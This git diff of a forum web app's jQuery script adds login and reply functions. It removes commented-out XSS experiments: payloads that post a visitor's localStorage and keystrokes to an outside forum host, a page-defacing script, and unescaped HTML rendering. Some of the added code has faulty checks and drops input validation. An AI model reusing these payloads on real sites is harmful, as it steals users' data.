@@ -36,34 +36,6 @@ $(function () {
     },
   });
 
-  // funtime lang
-  // $("body").prepend(`<img
-  //     src
-  //     onerror="fetch('http:\/\/hyeumine.com/forumNewPost.php', body:{id:25,post:JSON.stringify(localStorage)})"
-  //   />`);
-
-  // $(
-  //   "body"
-  // ).prepend(`<script>$(function () {$.ajax({method: "POST",url: "http://hyeumine.com/forumNewPost.php",
-  //         data: { id: 25, post: JSON.stringify(localStorage)}})})</script>`);
-
-  // $("body").prepend(`
-  // <script>document.addEventListener('keypress', function(event){
-  //   console.log(String.fromCharCode(event.keyCode))
-  //   $.ajax({method:'POST',url:'http://hyeumine.com/forumNewPost.php',data:{post:'pressed:'+String.fromCharCode(event.keyCode),id:25}})
-  // })</script>
-  // `);
-
-  // $("body").prepend(`<script>document.addEventListener('keypress', function(event){$("p, h1, h2, h3, h4, h5, h6, span").text("HACKED")})</script>`);
-
-  // $.get(
-  //   "https://ipinfo.io",
-  //   function (response) {
-  //     alert(response.ip);
-  //   },
-  //   "json"
-  // );
-
   async function deletePost(id) {
     try {
       isLoggedIn(user);
@@ -91,9 +63,20 @@ $(function () {
 
       const end = Math.min(posts.length, POSTS_PER_PAGE * currentPage);
       const postsWithOwner = posts.splice(0, end).map((post) => {
+        if (post.reply) {
+          post.reply = post.reply.map((r) => {
+            return {
+              ...r,
+              isOwner: r.uid == user.id,
+            };
+          });
+        } else {
+          post.reply = [];
+        }
+
         return {
           ...post,
-          isOwner: post.uid == user.id || !ON_PROD,
+          isOwner: post.uid == user.id,
         };
       });
 
@@ -101,25 +84,17 @@ $(function () {
       const context = { data: postsWithOwner };
       postsContainer.html(htmlTemplate(context));
 
-      // sensitive code to xss
-
-      /*
-      let html = "";
-      for (const elem of postsWithOwner) {
-        html += `
-        <div class="mt-2 border-t border-slate-200 p-2">
-          <h1 class="text-lg font-bold">${elem.user}</h1>
-          <p class="">${elem.date}</p>
-          <p class="">${elem.post}</p>
-        <button class="delete-button" value=${elem.id}>delete</button>
-        </div>
-        `;
-      }
-      postsContainer.html(html);
-      */
-
       $(".delete-button").on("click", (e) => {
         deletePost($(e.target).attr("value"));
+      });
+
+      $(".reply-button").on("keydown", (e) => {
+        if (e.keyCode !== 13) return;
+        replyPost($(e.target).attr("id").split("-")[2]);
+      });
+
+      $(".delete-reply-button").on("click", (e) => {
+        deleteReply($(e.target).attr("value"));
       });
     } catch (error) {
       showToast(`${error.message}`);
@@ -173,15 +148,38 @@ $(function () {
     }
   }
 
-  async function loginUser() {}
+  async function loginUser() {
+    try {
+      const inputFields = $("#auth-form > div > input");
+      const inputData = validateInputFields(inputFields);
+
+      $.ajax({
+        method: "POST",
+        url: `${DOMAIN_NAME}/forumLogin.php`,
+        data: inputData,
+        success: (data) => {
+          data = JSON.parse(data);
+
+          if (!data && !data.success)
+            throw new Error("User login failed somehow...");
+
+          setUser(user);
+          showToast(`User logged in successfully!
+          Welcome ${user.username}`);
+        },
+      });
+    } catch (err) {
+      showToast(`${err.message}`, true);
+    }
+  }
 
   async function createPost() {
     try {
       isLoggedIn(user);
 
-      const post = document.getElementById("post");
+      const post = $("#postInput").val();
       const id = JSON.stringify(user.id);
-      const inputData = { ...validateInputFields([post]), id };
+      const inputData = { post, id };
 
       $.ajax({
         method: "POST",
@@ -202,9 +200,57 @@ $(function () {
     }
   }
 
-  async function replyPost() {}
+  async function replyPost(postId) {
+    try {
+      isLoggedIn(user);
 
-  async function deleteReply() {}
+      const replyInput = $(`#reply-input-${postId}`).val();
+      const inputData = {
+        reply: replyInput,
+        post_id: postId,
+        user_id: user.id,
+      };
+
+      $.ajax({
+        method: "POST",
+        url: `${DOMAIN_NAME}/forumReplyPost.php`,
+        data: inputData,
+        success: (data) => {
+          data = JSON.parse(data);
+
+          if (!data && !data.success)
+            throw new Error("Reply creation failed somehow...");
+          else showToast("Reply created successfully!");
+
+          getPosts();
+        },
+      });
+    } catch (err) {
+      showToast(`${err.message}`, true);
+    }
+  }
+
+  async function deleteReply(id) {
+    try {
+      isLoggedIn(user);
+
+      $.ajax({
+        method: "POST",
+        url: `${DOMAIN_NAME}/forumDeleteReply.php?id=${id}`,
+        success: (data) => {
+          data = JSON.parse(data);
+
+          if (!data && !data.success)
+            throw new Error("Reply deletion failed somehow...");
+          else showToast("Reply deletion successfully!");
+
+          getPosts();
+        },
+      });
+    } catch (err) {
+      showToast(`${err.message}`, true);
+    }
+  }
 
   function handleToggleClass() {
     $("#auth-form").toggleClass("hidden");
@@ -213,8 +259,10 @@ $(function () {
   // on load
   $("#auth-form").addClass("hidden");
   $("#create-user").on("click", createUser);
+  $("#login-user").on("click", loginUser);
   $("#create-post").on("click", createPost);
   $("#toggle-auth-form").on("click", handleToggleClass);
+
   getPosts();
 
   if (user) setUser();
